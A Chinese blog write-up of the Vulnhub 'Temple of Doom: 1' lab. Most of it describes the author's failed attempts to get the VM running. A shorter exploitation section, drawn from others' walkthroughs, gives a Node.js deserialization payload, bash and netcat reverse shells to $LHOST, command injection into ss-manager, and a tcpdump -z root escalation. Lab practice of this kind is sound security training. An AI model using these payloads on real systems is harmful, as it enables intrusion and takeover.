---
title: TEMPLE OF DOOM:1
date: 2024-02-25  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/TempleOfDoom1.html"
---

# TEMPLE OF DOOM: 1（靶场配置失败）

![image-20240225131935585](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742640.png)

是一个easy靶场，打开看一下：

## 配置靶场

导入时候发送了报错：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742642.png" alt="image-20240225133136098" style="zoom:50%;" />

参考[师傅的blog](https://www.cnblogs.com/sn1per/p/11947433.html)进行修改：

>  解压ova文件会得到两个文件，后缀名分别为ovf和vmdx

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742643.png" alt="image-20240225133849689" style="zoom:50%;" />

之后导入解压后的ovf文件，还是出现了错误：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742644.png" alt="image-20240225134113532" style="zoom:50%;" />

尝试创建虚拟机使用解压出来的网卡试一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742645.png" alt="image-20240225134719879" style="zoom:50%;" />

卡在这一步了，尝试使用以下`virtualbox`虚拟机吧。。。。。且慢，好像进来了：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742646.png" alt="image-20240225134937017" style="zoom:50%;" />

好多报错。。。。尝试扫描一下：

```bash
sudo arp-scan -l
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742647.png" alt="image-20240225135831361" style="zoom: 50%;" />

### 警告WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied

解决办法：

```bash
cd /usr/share/arp-scan
chmod -R 777 ieee-oui.txt 
cd /etc/arp-scan 
chmod -R 777 mac-vendor.txt
```

再回到靶场：尝试`virtualbox`打开看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742648.png" alt="image-20240225140225155" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742649.png" alt="image-20240225140515663" style="zoom:33%;" />

嘶，扫一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742650.png" alt="image-20240225140603201" style="zoom:33%;" />

没办法了，看看师傅们是不是也遇到了这个问题。。。。

尝试创建一个网卡：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742651.png" alt="image-20240225141601408" style="zoom:50%;" />

将靶场网卡改为`NAT网络`，重启靶场：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742652.png" alt="image-20240225141938499" style="zoom:50%;" />

扫描一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742653.png" alt="image-20240225142023635" style="zoom:50%;" />

。。。。。。。神魔情况。。看师傅们好像都没出现这种错误。。。。

只能再次尝试上面师傅的那个操作，看看有没有办法了。。。。

### vmware垂死挣扎

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742654.png" alt="image-20240225153939388" style="zoom:50%;" />

打开看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742656.png" alt="image-20240225154019095" style="zoom:50%;" />

更改`.ovf`文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742657.png" alt="image-20240225154309109" style="zoom:50%;" />

导入虚拟机：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742658.png" alt="image-20240225154554007" style="zoom:33%;" />

还是有这个报错，难道是有检验？再瞅瞅代码，头痛，不知道咋回事，再尝试一下`.vmdk`硬盘导入试试：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742659.png" alt="image-20240225155523148" style="zoom:50%;" />

常用命令都用不了，但是help可以用，尝试扫描一下，还是扫不到，这让我想起了，之前使用导入硬盘的时候让我转换来着，我没转换。试试是不是转换了就能扫到了。。。。

还是扫不到。。。。看来`vmware`是不太好搞的，只能回归`virtualbox`了

### virtualbox

配置的时候发现了`vdi`文件：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742660.png" alt="image-20240225161321910" style="zoom:50%;" />

尝试进行转换：

```bash
VBoxManage.exe clonehd E:\vulnhub\TempleOfDOOM\TOD\TOD.vdi E:\vulnhub\TempleOfDOOM\TOD\TOD.vmdk --format VMDK
vmware-vdiskmanager.exe -r "E:\vulnhub\TempleOfDOOM\TOD\TOD.vmdk" -t 0 "E:\vulnhub\TempleOfDOOM\TOD\TOD1.vmdk"
```

遇到报错：

```text
VBoxManage.exe: error: Cannot register the hard disk 'E:\vulnhub\TempleOfDOOM\TOD\TOD.vdi' {668a93fe-d485-4e97-8643-6300cb805763} because a hard disk 'E:\vulnhub\New group\Temple of Doom\Temple of Doom-disk001.vdi' with UUID {668a93fe-d485-4e97-8643-6300cb805763} already exists
VBoxManage.exe: error: Details: code E_INVALIDARG (0x80070057), component VirtualBoxWrap, interface IVirtualBox, callee IUnknown
VBoxManage.exe: error: Context: "OpenMedium(Bstr(pszFilenameOrUuid).raw(), enmDevType, enmAccessMode, fForceNewUuidOnOpen, pMedium.asOutParam())" at line 201 of file VBoxManageDisk.cpp
```

解决办法：

```bash
VBoxManage.exe internalcommands sethduuid "E:\vulnhub\TempleOfDOOM\TOD\TOD.vdi"
```

再继续进行命令。

```bash
VBoxManage.exe clonehd E:\vulnhub\TempleOfDOOM\TOD\TOD.vdi E:\vulnhub\TempleOfDOOM\TOD\TOD.vmdk --format VMDK
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
Clone medium created in format 'VMDK'. UUID: 85ee6c12-3095-4c08-96b9-e6570b7a31e6
vmware-vdiskmanager.exe -r "E:\vulnhub\TempleOfDOOM\TOD\TOD.vmdk" -t 0 "E:\vulnhub\TempleOfDOOM\TOD\TOD1.vmdk"
Creating disk 'E:\vulnhub\TempleOfDOOM\TOD\TOD1.vmdk'
  Convert: 100% done.
Virtual disk conversion successful.
```

尝试使用现在的硬盘，看看能不能成功！！！！失败。。。。

最后试一下virtualbox吧，实在不行只能跳过这个靶场了，找师傅的blog学习一下：

直接学习吧。。。

## 信息搜集

### 端口扫描

```bash
sudo nmap -sS -A -p- IP
sduo nmap -sS -sV -T5 -p- IP
rustscan -a IP
```

```
PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 7.7 (protocol 2.0)
666/tcp open  http    syn-ack Node.js Express framework
```

### 目录扫描

```bash
dirb -u IP:666
```

### 漏洞扫描

```
nikto -h IP:666
```

## 漏洞利用

cookie是一个编码结果：

```json
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":Friday, 13 Oct 2018 00:00:00 GMT"}
```

需要修改为：

```json
{"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
```

需要利用到反序列化漏洞：

```
{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(error,stdout,stderr)=>{console.log(stdout)}); }()"}
```

- child_process是node.js中的一个模块，它以类似于popen（3）的方式生成子进程。
- child_process.exec（）方法：此方法在控制台中运行命令并缓冲输出

编译以后抓包传上去：

```bash
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe3JldHVybiByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ3dob2FtaScsKGUsb3V0LGVycik9Pntjb25zb2xlLmxvZyhvdXQpO30pOyB9KCkifQo=
```

获得用户名`nodeadmin`

设置一个反弹shell：

```bash
{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1',(error,stdout,stderr)=>{console.log(stdout)}); }()"}
# kali
nc -lvnp LHOST
```

## 提权

然后师傅们看到`fireman`用户：

```bash
ps -ef | grep fireman
```

发现此用户启动了`ss-manager`进程，也可以使用一下命令查看与`fireman`有关的文件:

```bash
find / -type f -name "*" |xargs grep -ri "fireman" 2>/dev/null
ps -aux | grep ss-manager
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202402251742661.png" alt="image-20240225173111186" style="zoom:50%;" />

漏洞利用需要开启`8839`端口，查看一下是否开启了这个端口：

```bash
netstat -a | grep 8839
nc -u 127.0.0.1 8839
# 配置JSON，执行命令，在tmp创建evil文件
add: {"server_port":8003, "password":"test", "method":"||touch /tmp/evil||"}
# 使用bash，获得反弹shell
add: {"server_port":8003, "password":"test", "method":"||bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1|"}

# kali
nc -lvp $LPORT
```

此时到root下但是没有权限，使用`sudo -l`查看一下相关命令

检查发现`fireman`具备`sudo`权限：

```bash
# 使用tcpdump，可以用于远程代码执行
echo "nc  -e /bin/bash $LHOST $LPORT "> shell.sh
chmod +x shell.sh
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell.sh -Z root
```

将nc反弹shell写入sh文件，赋执行权限，通过tcpdump执行反弹shell，获得root权限

最后获得完整的tty,获得flag：

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
cd /root
cat flag.txt
```

## 参考blog

https://blog.csdn.net/qq_34801745/article/details/104061415

https://blog.csdn.net/elephantxiang/article/details/121593344

https://www.freebuf.com/articles/web/260403.html

https://www.c0dedead.io/temple-of-doom-1-walkthrough/
